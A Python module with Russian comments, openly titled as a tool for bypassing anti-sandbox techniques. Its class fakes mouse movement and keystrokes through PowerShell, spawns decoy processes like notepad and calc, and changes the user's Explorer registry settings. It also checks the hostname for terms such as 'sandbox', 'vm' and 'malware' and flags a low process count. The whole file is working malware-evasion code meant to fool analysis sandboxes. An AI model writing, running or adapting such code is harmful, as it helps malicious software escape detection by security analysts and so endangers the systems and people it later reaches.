#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Anti Sandbox - Модуль обхода анти-песочничных техник
Эмуляция активности пользователя и системных событий
"""

import subprocess
import time
import random
from datetime import datetime

class AntiSandbox:
    def __init__(self):
        self.fake_processes = []
        
    def emulate_user_activity(self):
        """Эмуляция активности пользователя"""
        print("[*] Эмуляция активности пользователя...")
        
        # Движение мыши (симуляция)
        try:
            for _ in range(5):
                # Симуляция движения мыши через PowerShell
                subprocess.run(
                    'powershell -command "Add-Type -AssemblyName System.Windows.Forms; $pos = [System.Windows.Forms.Cursor]::Position; $pos.X += {}; $pos.Y += {}; [System.Windows.Forms.Cursor]::Position = $pos"'.format(
                        random.randint(-50, 50),
                        random.randint(-50, 50)
                    ),
                    shell=True, capture_output=True, timeout=2
                )
                time.sleep(0.5)
        except:
            pass
        
        # Эмуляция нажатий клавиш
        try:
            subprocess.run(
                'powershell -command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait(\'{TAB}\')"',
                shell=True, capture_output=True, timeout=2
            )
        except:
            pass
    
    def fake_registry_entries(self):
        """Создание фейковых записей в реестре"""
        print("[*] Создание фейковых записей реестра...")
        
        registry_entries = [
            ('HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced', 'Hidden', 1),
            ('HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced', 'HideFileExt', 0),
            ('HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Theme\\Personalize', 'AppsUseLightTheme', 1),
        ]
        
        for key, name, value in registry_entries:
            try:
                subprocess.run(
                    f'reg add "{key}" /v "{name}" /t REG_DWORD /d {value} /f',
                    shell=True, capture_output=True, timeout=2
                )
            except:
                pass
    
    def spawn_fake_processes(self):
        """Запуск фейковых процессов для маскировки"""
        print("[*] Запуск фейковых процессов...")
        
        fake_commands = [
            'notepad.exe',
            'calc.exe',
            'mspaint.exe',
        ]
        
        for cmd in fake_commands:
            try:
                proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                self.fake_processes.append(proc)
                time.sleep(0.2)
            except:
                pass
    
    def stop_fake_processes(self):
        """Остановка фейковых процессов"""
        print("[*] Остановка фейковых процессов...")
        
        for proc in self.fake_processes:
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except:
                try:
                    proc.kill()
                except:
                    pass
        
        self.fake_processes = []
    
    def check_sandbox_indicators(self):
        """Проверка индикаторов песочницы (для отладки)"""
        indicators = []
        
        # Проверка имени компьютера
        result = subprocess.run('hostname', shell=True, capture_output=True, text=True)
        hostname = result.stdout.strip().lower()
        
        sandbox_hostnames = ['sandbox', 'vm', 'virtual', 'malware', 'analysis']
        if any(s in hostname for s in sandbox_hostnames):
            indicators.append(f'Suspicious hostname: {hostname}')
        
        # Проверка количества процессов
        result = subprocess.run('tasklist', shell=True, capture_output=True, text=True)
        process_count = len(result.stdout.strip().split('\n'))
        
        if process_count < 30:  # Мало процессов
            indicators.append(f'Low process count: {process_count}')
        
        return indicators
    
    def get_status(self):
        """Получение статуса модуля"""
        return {
            'active': True,
            'fake_processes_count': len(self.fake_processes),
            'timestamp': datetime.now().isoformat()
        }
